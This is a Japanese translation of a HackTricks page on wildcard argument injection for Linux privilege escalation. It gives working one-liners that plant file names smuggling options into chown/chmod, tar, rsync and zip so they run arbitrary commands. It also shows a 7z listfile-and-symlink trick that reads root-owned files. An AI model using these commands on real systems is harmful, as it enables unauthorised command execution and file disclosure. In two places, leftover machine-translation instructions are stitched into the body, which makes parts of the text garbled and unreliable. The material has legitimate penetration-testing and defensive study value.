<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>


## chown, chmod

**残りのファイルに対して、どのファイルオーナーと権限をコピーしたいかを指定できます**
```bash
touch "--reference=/my/own/path/filename"
```
以下のテキストは、ハッキング技術に関する本の内容です。関連する英語のテキストを日本語に翻訳し、まったく同じマークダウンおよびHTML構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

これを利用するには、[https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(組み合わせ攻撃)_ を使用します。\
__詳細は [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) にあります。

## Tar

**任意のコマンドを実行:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
以下は、ハッキング技術に関するハッキングの本の内容です。ファイル linux-hardening/privilege-escalation/wildcards-spare-tricks.md の関連する英語テキストを日本語に翻訳し、まったく同じマークダウンおよびhtml構文を保持して翻訳を返してください。コード、ハッキング技術名、ハッキング用語、クラウド/SaaSプラットフォーム名（Workspace、aws、gcpなど）、'leak'という単語、ペネトレーションテスト、およびマークダウンタグのようなものは翻訳しないでください。また、翻訳とマークダウン構文以外の余分なものは追加しないでください。

これを利用するには、[https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_ を使用します。\
__詳細は [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) にあります。

## Rsync

**任意のコマンドを実行:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
この攻撃は [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) (_rsync_ 攻撃) を使用して利用できます。\
__詳細は [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930) にあります。

## 7z

**7z** では、`--` の後に `*` を使用しても（`--` はその後の入力がパラメータとして扱われないことを意味するので、この場合はファイルパスのみです）、任意のエラーを発生させてファイルを読み取ることができます。したがって、以下のようなコマンドが root によって実行されている場合：
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
フォルダ内でファイルを作成できる場合、`@root.txt` ファイルと、読みたいファイルへの**シンボリックリンク**である `root.txt` ファイルを作成できます：
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
その後、**7z**が実行されると、`root.txt`を圧縮すべきファイルのリストを含むファイルとして扱います（これは`@root.txt`の存在が示しています）。そして、7zが`root.txt`を読むとき、`/file/you/want/to/read`を読みますが、**このファイルの内容がファイルのリストではないため、エラーを投げて内容を表示します。**

_詳細はHackTheBoxのCTFボックスのWrite-upsを参照してください。_

## Zip

**任意のコマンドを実行:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローしてください。**
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングテクニックを共有してください。

</details>
```
